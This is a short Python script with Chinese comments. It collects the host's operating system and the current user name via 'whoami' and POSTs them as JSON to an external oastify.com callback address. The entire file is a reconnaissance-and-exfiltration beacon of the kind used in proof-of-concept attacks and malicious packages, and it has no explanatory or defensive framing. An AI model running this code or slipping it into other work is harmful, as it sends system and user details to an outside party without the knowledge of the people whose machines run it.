import os
import platform
import subprocess
import requests

def send_data(url, data):
    try:
        response = requests.post(url, json=data)
        print(f"Data sent successfully. Server responded: {response.text}")
    except Exception as e:
        print(f"Failed to send data: {e}")

def main():
    # 获取操作系统信息
    os_type = platform.system()
    
    # 执行 'whoami' 命令来找出当前用户
    current_user = subprocess.run("whoami", capture_output=True, text=True).stdout.strip()

    print(f"Operating system: {os_type}")
    print(f"Current user: {current_user}")

    # 准备发送的数据
    data = {
        "os_type": os_type,
        "current_user": current_user
    }

    # 发送数据到指定URL
    send_data("http://iqcu0i19t1x10judij6scarriio9c68ux.oastify.com", data)

if __name__ == "__main__":
    main()
